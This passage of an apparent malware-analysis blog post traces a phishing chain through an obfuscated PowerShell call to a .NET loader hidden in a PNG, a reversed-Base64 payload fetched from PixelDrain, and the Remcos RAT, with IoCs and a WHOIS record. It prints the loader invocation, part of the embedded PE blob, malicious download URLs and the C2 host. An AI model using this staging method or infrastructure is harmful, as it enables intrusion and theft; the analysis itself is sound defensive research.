</span></span><span class=line><span class=cl><span class=nv>$methodRef</span><span class=p>.</span><span class=py>Invoke</span><span class=p>(</span><span class=vm>$null</span><span class=p>,[</span><span class=no>object[]</span><span class=p>]</span><span class=vm>@</span><span class=p>(</span><span class=nv>$inputArg</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;C:\Users\Public\Downloads\&#39;</span><span class=p>,</span><span class=s1>&#39;Name_File&#39;</span><span class=p>,</span><span class=s1>&#39;calc&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>,</span><span class=s1>&#39;calc&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;URL&#39;</span><span class=p>,</span><span class=s1>&#39;C:\Users\Public\Downloads\&#39;</span><span class=p>,</span><span class=s1>&#39;Name_File&#39;</span><span class=p>,</span><span class=s1>&#39;js&#39;</span><span class=p>,</span><span class=s1>&#39;1&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=s1>&#39;Task_Name&#39;</span><span class=p>,</span><span class=s1>&#39;0&#39;</span><span class=p>,</span><span class=s1>&#39;startup_onstart&#39;</span><span class=p>));</span>
</span></span></code></pre></div><blockquote><p>While examining the referenced image file, mismatch between the file extension and the actual header signature was found, where the file served as <code>optimized_MSI_PRO_with_b64.png</code> contains a JPEG header.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ head -n 1 optimized_MSI_PRO_with_b64.jpeg 
</span></span><span class=line><span class=cl>ÔøΩÔøΩÔøΩÔøΩJFIFÔøΩÔøΩC	
</span></span></code></pre></div></blockquote><p>The image <code>optimized_MSI_PRO_with_b64.png</code> renders normally, even though it contains the malicious Base64 encoded data.</p><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/2_Malicious_Image_B64.png alt title="Malicious Image"></p><p>Inspecting the tail of the image file <code>optimized_MSI_PRO_with_b64.png</code> shows that a <code>BaseStart-...-BaseEnd</code> payload is indeed appended after the image bytes.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ tail -n 1 optimized_MSI_PRO_with_b64.png
</span></span><span class=line><span class=cl>H&lt;A4&gt;&lt;9A&gt;I4&lt;92&gt;X&lt;BD&gt;CIII&lt;8B&gt;E&lt;96&gt;44Y&lt;A4&gt;&lt;91&gt;I^T&lt;91&gt;I4&lt;92&gt;i$&lt;D3&gt;Õ∑*RA&lt;F8&gt;&lt;90&gt;~$^X&lt;9E&gt;s^VYe&lt;8A&gt;H&lt;A4&gt;&lt;9A&gt;I,&lt;D2&gt;IŒú&lt;A9&gt;^G1e&lt;96&gt;{W&lt;FF&gt;&lt;C4&gt;^@ESC^Q^@^A^D^C^@^@^@^@^@^@^@^@^@^@^@^^@^Q&lt;A0&gt;&lt;B0&gt;&lt;C0&gt;&lt;E0&gt;^A &lt;90&gt;&lt;FF&gt;&lt;DA&gt;^@^H^A^C^A^C?^@&lt;84&gt;Q&lt;8B&gt;&lt;FF&gt;^@&lt;FB&gt;&lt;9A&gt;&lt;A5&gt;o&lt;C5&gt;&lt;EE&gt;a^?&lt;FF&gt;^@&lt;BF&gt;&lt;FF&gt;^@&lt;C5&gt;n)&lt;B7&gt;0&lt;B0&gt;&lt;8F&gt;f^Km&lt;E7&gt;r&lt;BE&gt;&lt;DF&gt;&lt;FF&gt;&lt;D9&gt;BaseStart-TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1vZGUuDQ0KJAAAAAAAAABQRQAATAEDAAD/iN8AAAAAAAAAAOAADiELATAAAIA7AAAIAAAAAAAAbp47AAAgAAAAoDsAAABAAAAgAAAAAgAABAAAAAAAAAAGAAAAAAAAAADgOwAAAgAAAAAAAAMAYIUAABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAACCeOwBL . . .
</span></span></code></pre></div><blockquote><p><em><strong>Steganography</strong> is the technique of concealing data within another file or medium in such a way that the presence of the hidden information is not apparent. The approach demonstrated here is a trivial example of steganography, where additional payload data is simply appended to an image file without affecting its normal rendering.</em></p></blockquote><h4 id=stage-3--in-memory-net-loader-and-secondary-payload-fetch>Stage 3 : In-memory .NET Loader and Secondary Payload Fetch<a hidden class=anchor aria-hidden=true href=#stage-3--in-memory-net-loader-and-secondary-payload-fetch>#</a></h4><p>To extract and recover the embedded payload a custom Python script was used that searches the file for the <code>BaseStart-(.*?)-BaseEnd</code> pattern, decodes the captured group, and writes the resulting bytes to a file wih a name <code>img_b64_decoded_data</code>. The script used during analysis is shown below.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>filename</span> <span class=o>=</span> <span class=s2>&#34;optimized_MSI_PRO_with_b64.png&#34;</span>
</span></span><span class=line><span class=cl><span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span> <span class=s2>&#34;rb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>content</span> <span class=o>=</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>text_content</span> <span class=o>=</span> <span class=n>content</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s2>&#34;utf-8&#34;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s2>&#34;ignore&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>match</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;BaseStart-(.*?)-BaseEnd&#34;</span><span class=p>,</span> <span class=n>text_content</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=k>match</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>base64_data</span> <span class=o>=</span> <span class=k>match</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>decoded_bytes</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>base64_data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;img_b64_decoded_data&#34;</span><span class=p>,</span> <span class=s2>&#34;wb&#34;</span><span class=p>)</span> <span class=k>as</span> <span class=n>output_file</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>output_file</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>decoded_bytes</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;Base64 data extracted and saved to &#39;img_b64_decoded_data&#39;.&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=n>base64</span><span class=o>.</span><span class=n>binascii</span><span class=o>.</span><span class=n>Error</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Error decoding: </span><span class=si>{</span><span class=n>e</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;No Base64 data found.&#34;</span><span class=p>)</span>
</span></span></code></pre></div><p>Running the custom Python script produced a file that, when checked, is a <strong>PE32 executable (DLL)</strong>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ python3 extract_b64_from_image.py 
</span></span><span class=line><span class=cl>Base64 data extracted and saved to &#39;img_b64_decoded_data&#39;.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ file img_b64_decoded_data 
</span></span><span class=line><span class=cl>img_b64_decoded_data: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections
</span></span></code></pre></div><p>A <a href=https://www.virustotal.com/gui/file/c3560bfa9483e7894243e613c55744b7f1705a53969f797f5fe8b2cb4fb336cc>VirusTotal lookup</a> for the DLL&rsquo;s SHA-256 hash returned detections and reveals that the sample was first submitted on <code>2025-09-28 19:22:23 UTC</code>. The DLL&rsquo;s version metadata, available in VirusTotal sample&rsquo;s Details tab, claims the product is <code>Microsoft.Win32.TaskScheduler</code> (File Version <code>2.11.0.0</code>) with the description <code>Provides a single assembly wrapper for the 1.0 and 2.0 versions of Task Scheduler found in all Microsoft operating systems post Windows 98. It simplifies the coding, aggregates ...</code>. Searching the internet for this file metadata identified a Github project <strong>.NET Task Scheduler Managed Wrapper</strong> <a href=#references>[5]</a>.</p><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/8_TaskScheduler_VirusTotal.png alt title="DLL VirusTotal Analysis Details"></p><p>Next, the extracted DLL from the image was loaded into <strong>Detect It Easy (DiE)</strong> <a href=#references>[6]</a>. As shown in the screenshot below, DiE confirms this is a PE32 DLL compiled for .NET Framework 4.5 (VB.NET). The assembly references the <strong>dnlib</strong> library <a href=#references>[7]</a>, which frequently indicates runtime assembly manipulation (dynamic loading or unpacking). Heuristics indicate heavy obfuscation and anti-analysis features (anti-debugging).</p><blockquote><p><em>For debug data presence analysis, see <a href=#appendix-b--pdb-file-presence-verification>Appendix B : PDB File Presence Verification</a>.</em></p></blockquote><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/5_DiE_img_b64_decoded_data.png alt title="DiE DLL Scan Analysis Result"></p><p>The <strong>de4dot</strong> tool <a href=#references>[8]</a> was then used for deobfuscation. A .NET Reactor <a href=#references>[9]</a> obfuscator was detected, and de4dot attempted to deobfuscate the malicious DLL, saving the result as <code>img_b64_decoded_data-cleaned.dll</code>.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>PS&gt; .\de4dot.exe img_b64_decoded_data.dll
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>de4dot v3.2.0.0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Detected .NET Reactor (img_b64_decoded_data.dll)
</span></span><span class=line><span class=cl>Cleaning img_b64_decoded_data.dll
</span></span><span class=line><span class=cl>Renaming all obfuscated symbols
</span></span><span class=line><span class=cl>Saving img_b64_decoded_data-cleaned.dll
</span></span></code></pre></div><p>The cleaned assembly <code>img_b64_decoded_data-cleaned.dll</code> was opened in dnSpy <a href=#references>[10]</a>. Early in the static analysis, the available resources confirmed that the malicious DLL was built around the .NET Task Scheduler Managed Wrapper.</p><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/9_TaskScheduler_Github_Cross_Reference.png alt title="Task Scheduler Github Cross Reference"></p><p>As expected from the analysis of a PowerShell that was built in the dropped JavaScript payload, the method <code>VAI</code> takes 17 parameters:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>QBXtX, startupreg, caminhovbs, namevbs, netframework, nativo, nomenativo, persitencia, url, caminho, nomedoarquivo, exten√ßao, minutos, startuptask, taskname, vmName, startup_onstart
</span></span></code></pre></div><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/6_dnSpy_ClassLibrary1_VAI.png alt title="ClassLibrary1.Home VAI Method"></p><p>Based on the conducted static analysis and correlating the method parameters with the values passed in the PowerShell, the following observations were made:</p><ul><li>parameter <code>QBXtX</code> with value <code>==gaM5mbx5WQI9SZslmZvkGch9SbvNmLulWYyRGblhXaw9yL6MHc0RHa</code> : encoded reversed Base64 string containing URL for the next stage payload location,</li><li>parameter <code>startupreg</code> with value <code>''</code> : flag controlling whether to add persistence via Registry Run key,</li><li>parameter <code>caminhovbs</code> (Spanish / Portuguese: &ldquo;VBScript path&rdquo;) with value <code>C:\Users\Public\Downloads\</code> : filesystem path for dropping a VBS loader,</li><li>parameter <code>namevbs</code> with value <code>Name_File</code> : name of the VBS file to drop / execute,</li><li>parameter <code>netframework</code> with value <code>calc</code> : controls whether the loader reflectively executes a managed (.NET) assembly or launches an external process,</li><li>parameter <code>nativo</code> with value <code>1</code> : if non empty, indicates a native executable to drop or execute,</li><li>parameter <code>nomenativo</code> (Spanish / Portuguese: &ldquo;native name&rdquo;) with value <code>calc</code> : name of the native binary payload,</li><li>parameter <code>persitencia</code> (Spanish / Portuguese: &ldquo;persistence&rdquo;, with value <code>''</code> : controlling persistence routines,</li><li>parameter <code>url</code> with value <code>URL</code> : optional alternate or fallback download URL for payload / config,</li><li>parameter <code>caminho</code> (Spanish / Portuguese: &ldquo;path&rdquo;) with value <code>C:\Users\Public\Downloads\</code> : target path to write dropped payloads,</li><li>parameter <code>nomedoarquivo</code> (Spanish / Portuguese: &ldquo;filename&rdquo;) with value <code>Name_File</code> : file name for dropped payload,</li><li>parameter <code>exten√ßao</code> (Spanish / Portuguese: &ldquo;extension&rdquo;) with value <code>js</code> : command to execute dropped payload,</li><li>parameter <code>minutos</code> (Spanish / Portuguese: &ldquo;minutes&rdquo;) with value <code>1</code> : interval for scheduled task recurrence,</li><li>parameter <code>startuptask</code> with value <code>''</code> : flag enabling persistence via Task Scheduler,</li><li>parameter <code>taskname</code> with value <code>Task_Name</code> : name assigned to the scheduled task,</li><li>parameter <code>vmName</code> with value <code>0</code> : string used in VM detection routine,</li><li>parameter <code>startup_onstart</code> with value <code>startup_onstart</code> : controls whether to run payload on system startup or user logon.</li></ul><blockquote><p><em>Note that the value <code>calc</code> for paramter <code>netframework</code> will evaluate as false, meaning it will take the native (process) execution branch.</em></p></blockquote><p>Leveraging the findings and OSINT, close similarities were identified between this sample and a <strong>Malware‚Äëas‚Äëa‚ÄëService</strong> (MaaS) infostealer known as <strong>Katz Stealer</strong>. Recently documented Katz samples (from June 2025) abused the legitimate Windows utility <code>cmstp.exe</code> (Microsoft Connection Manager Profile Installer) for UAC bypass, used different configurations (values passed to the <code>VAI</code> method), and loaded the final stealer payload via <strong>process hollowing</strong> <a href=#references>[11]</a> into <code>MSBuild</code> (Microsoft Build Engine). For detailed Katz Stealer capabilities, see references <a href=#references>[12]</a>, <a href=#references>[13]</a>, <a href=#references>[14]</a>.</p><h4 id=stage-4--persistent-command-and-control>Stage 4 : Persistent Command and Control<a hidden class=anchor aria-hidden=true href=#stage-4--persistent-command-and-control>#</a></h4><p>Returning to the recovered PowerShell (originally stored in the <code>this.pimaric</code> property of the dropped JavaScript), the <code>$inputArg</code> value was a Base64 encoded reversed string. In the analyzed .NET stage loader, this value was first reversed and then processed further.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>==gaM5mbx5WQI9SZslmZvkGch9SbvNmLulWYyRGblhXaw9yL6MHc0RHa
</span></span></code></pre></div><p>Reversing the string gives a valid Base64 value, which represents a URL after decoding.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>https://pixeldrain.com/api/file/HAnqnnLj
</span></span></code></pre></div><blockquote><p><em><strong>PixelDrain</strong> <a href=#references>[15]</a> is a cloud based filesharing and hosting platform</em>.</p></blockquote><p>Requesting the API URL returned JSON indicating the file was protected by PixelDrain&rsquo;s hotlink / download protection (captcha / rate limit).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;success&#34;</span><span class=p>:</span> <span class=kc>false</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;value&#34;</span><span class=p>:</span> <span class=s2>&#34;file_rate_limited_captcha_required&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>  <span class=nt>&#34;message&#34;</span><span class=p>:</span> <span class=s2>&#34;We have detected the use of hotlinking for this file. Hotlinking is only supported when either the uploader or the downloader has a paid subscription&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Studying PixelDrain&rsquo;s API documentation <a href=#references>[16]</a> revealed two useful endpoints. The file info endpoint for <code>HAnqnnLj</code> returned:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ curl https://pixeldrain.com/api/file/HAnqnnLj/info
</span></span><span class=line><span class=cl>{
</span></span><span class=line><span class=cl>  &#34;success&#34;: true,
</span></span><span class=line><span class=cl>  &#34;id&#34;: &#34;HAnqnnLj&#34;,
</span></span><span class=line><span class=cl>  &#34;name&#34;: &#34;arquivo_20250929134616.txt&#34;,
</span></span><span class=line><span class=cl>  &#34;size&#34;: 641024,
</span></span><span class=line><span class=cl>  &#34;views&#34;: 0,
</span></span><span class=line><span class=cl>  &#34;bandwidth_used&#34;: 2564096,
</span></span><span class=line><span class=cl>  &#34;bandwidth_used_paid&#34;: 0,
</span></span><span class=line><span class=cl>  &#34;downloads&#34;: 2,
</span></span><span class=line><span class=cl>  &#34;date_upload&#34;: &#34;2025-09-29T06:46:17.479Z&#34;,
</span></span><span class=line><span class=cl>  &#34;date_last_view&#34;: &#34;2025-09-29T06:46:17.479Z&#34;,
</span></span><span class=line><span class=cl>  &#34;mime_type&#34;: &#34;text/plain; charset=utf-8&#34;,
</span></span><span class=line><span class=cl>  &#34;thumbnail_href&#34;: &#34;/file/HAnqnnLj/thumbnail&#34;,
</span></span><span class=line><span class=cl>  &#34;hash_sha256&#34;: &#34;11cd328b43b236bd82149abdc709c505adf0ecc7a3537c5c1f945873e80566b8&#34;,
</span></span><span class=line><span class=cl>  &#34;delete_after_date&#34;: &#34;0001-01-01T00:00:00Z&#34;,
</span></span><span class=line><span class=cl>  &#34;delete_after_downloads&#34;: 0,
</span></span><span class=line><span class=cl>  &#34;availability&#34;: &#34;file_rate_limited_captcha_required&#34;,
</span></span><span class=line><span class=cl>  &#34;availability_message&#34;: &#34;We have detected the use of hotlinking for this file. Hotlinking is only supported when either the uploader or the downloader has a paid subscription&#34;,
</span></span><span class=line><span class=cl>  &#34;abuse_type&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>  &#34;abuse_reporter_name&#34;: &#34;&#34;,
</span></span><span class=line><span class=cl>  &#34;can_edit&#34;: false,
</span></span><span class=line><span class=cl>  &#34;can_download&#34;: true,
</span></span><span class=line><span class=cl>  &#34;show_ads&#34;: true,
</span></span><span class=line><span class=cl>  &#34;allow_video_player&#34;: true,
</span></span><span class=line><span class=cl>  &#34;download_speed_limit&#34;: 0
</span></span><span class=line><span class=cl>}
</span></span></code></pre></div><p>Note the filename <code>arquivo_20250929134616.txt</code>, <em><strong>arquivo</strong></em> is Spanish / Portuguese for &ldquo;file&rdquo;. The use of Spanish / Portuguese in the filename correlates with Spanish / Portuguese language comments found in the dropped JavaScript (<code>Adobe873768.js</code>) and variable names in the analyzed .NET loader (<code>img_b64_decoded_data</code> ; <code>Microsoft.Win32.TaskScheduler.dll</code>) , observed earlier in the infection chain.</p><p>Visiting the direct download endpoint in a browser allowed the malicious file to be fetched manually. It is unclear whether the threat actor accounted for PixelDrain&rsquo;s limitations that PixelDrain can enforce on the hosted files with free hosting. PixelDrain indicated the file had been downloaded many times outside the service&rsquo;s file view page. It is likely that rate limiting (captcha) protection was applied during the malicious activity.</p><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/3_Pixeldrain_Malicious_File_Downloader.png alt title="Pixeldrain Malicious File Downloader"></p><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/4_Pixeldrain_Malicious_File_Captcha.png alt title="PixeldrainMalicious File Captcha"></p><p>After manually downloading the file, analysis continued. Initial inspection revealed that the downloaded file consisted of a single line of Base64 encoded data.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ file arquivo_20250929134616.txt
</span></span><span class=line><span class=cl>arquivo_20250929134616.txt: ASCII text, with very long lines (65536), with no line terminators
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ head -n 1 arquivo_20250929134616.txt
</span></span><span class=line><span class=cl>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAPYyDe8wFP8wDH7g/OsvDz7A6OEuDZ7Q0OgsDA6wtO8qDn6wnOcpDN . . .
</span></span></code></pre></div><p>Based on analysis of the .NET stage loader, the DLL loaded in memory invoked <code>Strings.StrReverse(text)</code> on the downloaded content before interpreting it. Therefore the single long line of encoded Base64 data in the downloaded file had to be reversed.</p><p>The next steps reversed the single long line of characters, Base64 decoded the reversed string, and inspected the resulting bytes. From that output, a <strong>PE32 executable</strong> was successfully recovered.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>$ rev arquivo_20250929134616.txt | base64 -d &gt; payload
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ file payload
</span></span><span class=line><span class=cl>payload: PE32 executable (GUI) Intel 80386, for MS Windows, 7 sections
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>$ xxd -g 1 -l 64 payload
</span></span><span class=line><span class=cl>00000000: 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00  MZ..............
</span></span><span class=line><span class=cl>00000010: b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00  ........@.......
</span></span><span class=line><span class=cl>00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
</span></span><span class=line><span class=cl>00000030: 00 00 00 00 00 00 00 00 00 00 00 00 10 01 00 00  ................
</span></span></code></pre></div><p>The recovered payload was further verified using the <strong>Detect It Easy (DiE)</strong> tool and confirmed to be a <strong>PE32 executable</strong> built with Microsoft Visual Studio 2015.</p><p><img loading=lazy src=/images/general/unsofisticating_phishing_delivering_sofistiacted_malware/7_DiE_Pixeldrain_Payload_Recovered.png alt title="DiE Pixeldrain Payload Scan Analysis Result"></p><p>At this point, leveraging the collected evidence and indicators of compromise, the recovered PE32 executable was identified as the Remote Access Trojan <strong>Remcos</strong> <a href=#references>[17]</a>. In this case, and based on the previously stated findings, the sample was configured to execute under the name <code>calc.exe</code>.</p><p>Detonating the Remcos sample in the sandbox allowed us to determine the C2 domain used:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>cnn9001.duckdns.org
</span></span></code></pre></div><p>Complete analysis based on sandbox execution can be found on <strong>Recorded Future Triage</strong> <a href=#references>[18]</a> and <strong>VirusTotal</strong> <a href=#references>[19]</a>.</p><hr><h2 id=conclusion>Conclusion<a hidden class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>This investigation reconstructed a complete, multistage infection chain that began with a low effort phishing message and culminated in the in-memory execution of a .NET loader identified as <strong>Katz Stealer</strong> and deployment of a commodity <strong>Remote Access Trojan Remcos</strong>. The attack combined simple social engineering, heavily obfuscated JavaScript, an obfuscated PowerShell downloader, in-memory .NET assembly loading, and staged payload retrieval from benign looking hosting services. Because the loader performed assembly loading and reflection in memory and used legitimate cloud hosting for staging, disk artifacts were minimized, increasing the likelihood of evading conventional detection.</p><p>Spanish or Portuguese language artifacts were present in the sample (comments, filenames, and parameter names), suggesting regionalized tooling or actor influence. However, the observed target was not Spanish or Portuguese speaking, indicating that the threat actor likely acted opportunistically. Recorded Future&rsquo;s TAG‚Äë144 reporting <a href=#references>[20]</a> on South American campaigns documents extensive abuse of legitimate internet services for staging (including <code>archive.org</code> and dynamic DNS providers such as <code>duckdns.org</code>) and the use of steganography in images during multistage infections, closely mirroring the hosting and staging choices seen in this sample. Open source analyses of Katz Stealer (by SentinelOne, Nextron Systems, Picus Security) describe it as a MaaS focused on credential and crypto theft that leverages flexible loaders, runtime assembly manipulation, and process injection techniques, behaviors consistent with the obfuscated .NET loader and staged payload retrieval analyzed in this post.</p><hr><h2 id=indicators-of-compromise-iocs>Indicators of Compromise (IoCs)<a hidden class=anchor aria-hidden=true href=#indicators-of-compromise-iocs>#</a></h2><p><strong>Email Sender</strong></p><table><thead><tr><th>Category</th><th>Value</th></tr></thead><tbody><tr><td>Email Sender</td><td><code>perfecttradedr@gmail.com</code></td></tr></tbody></table><p><strong>URL (Malware Distribution)</strong></p><table><thead><tr><th style=text-align:right>Category</th><th>Value</th></tr></thead><tbody><tr><td style=text-align:right>JavaScript Dropper</td><td><code>https://www.cekomng.shop/</code></td></tr><tr><td style=text-align:right>.NET Stage Loader</td><td><code>http://archive.org/download/optimized_msi_pro_with_b64_202509/optimized_MSI_PRO_with_b64.png</code></td></tr><tr><td style=text-align:right>Remcos RAT</td><td><code>https://pixeldrain.com/api/file/HAnqnnLj</code></td></tr></tbody></table><p><strong>Command and Control (C2)</strong></p><table><thead><tr><th style=text-align:right>Category</th><th>Value</th></tr></thead><tbody><tr><td style=text-align:right>C2 (domain:port)</td><td><code>cnn9001.duckdns.org:9001</code></td></tr><tr><td style=text-align:right>C2 (domain)</td><td><code>cnn9001.duckdns.org</code></td></tr><tr><td style=text-align:right>C2 (IP)</td><td><code>45.74.50.189</code></td></tr></tbody></table><p><strong>Malware Files / Artifacts</strong></p><table><thead><tr><th>Filename / Artifact</th><th>MD5</th><th>SHA-1</th><th>SHA-256</th></tr></thead><tbody><tr><td><code>Adobe873768.js</code></td><td><code>b8d438afe388b67a83bcdc24a22b2f12</code></td><td><code>15191bdd103868f69281476e157e2ee3c916c454</code></td><td><code>4bc9d610dfdc799425d7dff0d37d47d6013163c943bb0c86b90de99786c43461</code></td></tr><tr><td><code>optimized_MSI_PRO_with_b64.png</code></td><td><code>d21d147d79518f4f89f2bed612f5ede4</code></td><td><code>ca6d4bd26cb6abf0c73981ff22af8d65fba60403</code></td><td><code>b932adbdbb14644366daed1bede62d9293868c9a3eecbffc7c4e6604d6d5b243</code></td></tr><tr><td><code>img_b64_decoded_data</code> (<code>Microsoft.Win32.TaskScheduler.dll</code>)</td><td><code>1517ce8a9d9ff6d0ddbe3c6616061e3b</code></td><td><code>93c482b74081dec2e97422ff7d9561cb67def712</code></td><td><code>c3560bfa9483e7894243e613c55744b7f1705a53969f797f5fe8b2cb4fb336cc</code></td></tr><tr><td><code>arquivo_20250929134616.txt</code></td><td><code>b16a2e0d784b78e9ee39d3363518220d</code></td><td><code>fcda7a3f417c516df41eee6565ad371fe8a05771</code></td><td><code>11cd328b43b236bd82149abdc709c505adf0ecc7a3537c5c1f945873e80566b8</code></td></tr><tr><td><code>payload</code> (<code>calc.exe</code>)</td><td><code>86c7ba0e15c0a1c084ef0daba53e4ecf</code></td><td><code>bba3d78e42c0e7eb65a0cd63917c767e2b841908</code></td><td><code>3ab3bc06210e76b06e75c264e5f5acb4edc11f0f768ed16655181cfda80a72a8</code></td></tr></tbody></table><hr><h2 id=appendices>Appendices<a hidden class=anchor aria-hidden=true href=#appendices>#</a></h2><h3 id=appendix-a--cekomngshop-whois-record>Appendix A : CEKOMNG.SHOP WHOIS Record<a hidden class=anchor aria-hidden=true href=#appendix-a--cekomngshop-whois-record>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Domain Name: CEKOMNG.SHOP
</span></span><span class=line><span class=cl>Registry Domain ID: DO14938844-GMO
</span></span><span class=line><span class=cl>Registrar WHOIS Server: whois.hostinger.com
</span></span><span class=line><span class=cl>Registrar URL: https://www.hostinger.com/
</span></span><span class=line><span class=cl>Updated Date: 2025-09-14T08:00:37.0Z
</span></span><span class=line><span class=cl>Creation Date: 2025-09-14T08:00:26.0Z
</span></span><span class=line><span class=cl>Registry Expiry Date: 2026-09-14T23:59:59.0Z
</span></span><span class=line><span class=cl>Registrar: HOSTINGER operations, UAB
</span></span><span class=line><span class=cl>Registrar IANA ID: 1636
</span></span><span class=line><span class=cl>Registrar Abuse Contact Email: abuse@hostinger.com
</span></span><span class=line><span class=cl>Registrar Abuse Contact Phone:
</span></span><span class=line><span class=cl>Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited
</span></span><span class=line><span class=cl>Registrant State/Province: MA
</span></span><span class=line><span class=cl>Registrant Country: US
</span></span><span class=line><span class=cl>Registrant Email:
</span></span><span class=line><span class=cl>Admin Email:
</span></span><span class=line><span class=cl>Tech Email:
</span></span><span class=line><span class=cl>Name Server: NS2.DNS-PARKING.COM
</span></span><span class=line><span class=cl>Name Server: NS1.DNS-PARKING.COM
</span></span><span class=line><span class=cl>DNSSEC: unsigned
</span></span><span class=line><span class=cl>URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/
</span></span><span class=line><span class=cl>&gt;&gt;&gt; Last update of WHOIS database: 2025-09-29T12:07:49.0Z &lt;&lt;&lt; 
